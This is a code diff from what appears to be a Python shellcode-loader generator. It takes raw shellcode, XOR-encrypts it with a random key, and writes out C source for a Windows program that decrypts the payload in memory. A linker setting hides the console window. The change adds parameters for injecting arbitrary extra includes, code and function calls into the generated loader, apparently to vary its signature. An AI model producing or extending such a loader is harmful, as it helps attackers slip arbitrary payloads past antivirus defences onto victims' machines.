@@ -6,7 +6,11 @@ __build__=""
 __language__=".c"
 __process__=".exe"
 
-def main(Shellcode):
+def main(**kwargs):
+    Shellcode=kwargs.get("shellcode")
+    Include=kwargs.get("include")
+    AllCode=kwargs.get("all_code")
+    AllFunctionName = kwargs.get("all_function_name")
     BytesTypeBinaryData=BinaryDataTypeConversion().StringToBytes(ast.literal_eval(repr(Shellcode).replace("\\\\", "\\")))#对数据进行类型转换
     GenerateRandomNumber=random.randint(1, 255)#生成的随机数
     XOREncryption=ShellcodeEncryptionAndDecryption().XOREncryption(GenerateRandomNumber,BytesTypeBinaryData)#进行XOR加密
@@ -14,13 +18,14 @@ def main(Shellcode):
 #include <windows.h>
 #include <stdio.h>
 #include <string.h>
-
+"""+Include+"""
 #pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows控制台程序不出黑窗口
-
+"""+AllCode+"""
 unsigned char buf[] = \""""+XOREncryption+"""\";
 int main()
 
 {
+    """+AllFunctionName+"""
     LPVOID Memory;
 for(int i = 0;i<sizeof(buf); i++){
   buf[i] ^= """+str(GenerateRandomNumber)+""";
